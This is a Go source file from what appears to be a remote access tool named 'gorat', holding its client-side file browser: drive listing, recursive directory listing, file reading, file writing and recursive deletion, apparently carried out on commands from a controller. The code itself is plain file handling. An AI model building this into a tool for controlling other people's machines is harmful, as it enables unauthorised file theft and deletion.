package client

import (
	"io/ioutil"
	"os"
	"path/filepath"
	"runtime"

	"gorat/common"
)

// FileBrowser handles file browsing operations
type FileBrowser struct{}

// NewFileBrowser creates a new file browser
func NewFileBrowser() *FileBrowser {
	return &FileBrowser{}
}

// GetDrives returns a list of available drives (Windows-specific)
func (fb *FileBrowser) GetDrives() *common.DriveListPayload {
	result := &common.DriveListPayload{
		Drives: []common.DriveInfo{},
	}

	// Only applicable for Windows
	if runtime.GOOS != "windows" {
		result.Error = "Drive listing only available on Windows"
		return result
	}

	// On Windows, check drives from A-Z
	drives := getDrivesWindows()
	result.Drives = drives

	return result
}

// Browse lists files in a directory
func (fb *FileBrowser) Browse(payload *common.BrowseFilesPayload) *common.FileListPayload {
	result := &common.FileListPayload{
		Path:  payload.Path,
		Files: []common.FileInfo{},
	}

	// Read directory
	entries, err := ioutil.ReadDir(payload.Path)
	if err != nil {
		result.Error = err.Error()
		return result
	}

	// Process entries
	for _, entry := range entries {
		fullPath := filepath.Join(payload.Path, entry.Name())

		fileInfo := common.FileInfo{
			Name:    entry.Name(),
			Path:    fullPath,
			Size:    entry.Size(),
			Mode:    entry.Mode().String(),
			ModTime: entry.ModTime(),
			IsDir:   entry.IsDir(),
		}

		result.Files = append(result.Files, fileInfo)

		// Recursively browse subdirectories
		if payload.Recursive && entry.IsDir() {
			subPayload := &common.BrowseFilesPayload{
				Path:      fullPath,
				Recursive: true,
			}
			subResult := fb.Browse(subPayload)
			result.Files = append(result.Files, subResult.Files...)
		}
	}

	return result
}

// ReadFile reads a file and returns its content
func (fb *FileBrowser) ReadFile(path string) *common.FileDataPayload {
	result := &common.FileDataPayload{
		Path: path,
	}

	data, err := ioutil.ReadFile(path)
	if err != nil {
		result.Error = err.Error()
		return result
	}

	result.Data = data
	result.Checksum = common.CalculateChecksum(data)

	return result
}

// WriteFile writes content to a file
func (fb *FileBrowser) WriteFile(payload *common.FileDataPayload) error {
	// Ensure directory exists
	dir := filepath.Dir(payload.Path)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return err
	}

	// Write file
	return ioutil.WriteFile(payload.Path, payload.Data, 0644)
}

// DeleteFile deletes a file or directory
func (fb *FileBrowser) DeleteFile(path string) error {
	return os.RemoveAll(path)
}

// GetFileInfo gets file metadata
func (fb *FileBrowser) GetFileInfo(path string) (*common.FileInfo, error) {
	info, err := os.Stat(path)
	if err != nil {
		return nil, err
	}

	absPath, _ := filepath.Abs(path)

	return &common.FileInfo{
		Name:    info.Name(),
		Path:    absPath,
		Size:    info.Size(),
		Mode:    info.Mode().String(),
		ModTime: info.ModTime(),
		IsDir:   info.IsDir(),
	}, nil
}
